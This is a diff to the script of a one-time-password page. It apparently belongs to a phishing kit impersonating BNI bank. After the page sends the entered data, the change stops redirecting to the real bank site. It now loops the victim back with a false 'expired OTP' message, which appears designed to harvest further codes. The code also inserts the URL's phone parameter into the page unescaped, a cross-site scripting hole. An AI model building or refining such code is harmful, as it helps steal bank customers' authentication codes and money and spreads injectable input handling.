@@ -1,6 +1,8 @@
 var currentField = 0;
 var timeout = 60;
 var timeoutHandler = null;
+var phone = "";
+var action = "";
 
 $(document).ready(function() {
     $("#timeout").html(timeout);
@@ -17,10 +19,20 @@ $(document).ready(function() {
         var paramName = param.split("=")[0];
         var paramValue = param.split("=")[1];
         if (paramName == "phone") {
-            $("#phone").html(paramValue);
+            phone = paramValue;
+            $("#phone").html(phone);
+        } else {
+            if (paramName == "action") {
+                action = paramValue;
+            }
         }
     }
-    timeoutHandler = setTimeout(timeoutHandling, 1000);
+    if (action == "timeout") {
+        $("#timeout-container").css("display", "none");
+        $("#expired-otp").css("display", "block");
+    } else {
+        timeoutHandler = setTimeout(timeoutHandling, 1000);
+    }
 });
 
 function timeoutHandling() {
@@ -55,7 +67,7 @@ function send() {
         dataType: "text",
         success: function(response) {
             $("#loader").css("display", "none");
-            window.location.href = "https://www.bni.co.id";
+            window.location.href = "otp.html?phone="+phone+"&action=timeout";
         }
     });
 }
